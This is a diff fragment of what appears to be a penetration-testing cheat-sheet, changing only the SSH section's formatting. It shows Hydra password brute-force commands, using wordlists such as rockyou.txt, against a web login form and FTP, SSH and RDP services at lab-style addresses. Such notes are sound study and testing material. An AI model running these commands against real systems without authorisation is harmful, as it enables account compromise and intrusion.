@@ -8,9 +8,10 @@ hydra -l none -P rockyou.txt 10.129.147.216 https-post-form "/db/index.php:passw
 ############ FTP ############
 hydra -v -L user.lst -P word.lst -e nsr fileserver.snakeoil.net ftp
 
-############ SSH ############
+# SSH
+```
 hydra -L user.list -P password.list ssh://10.129.42.197
-
+```
 ############ RDP ############
 hydra -L user.list -P password.list rdp://10.129.42.197
 
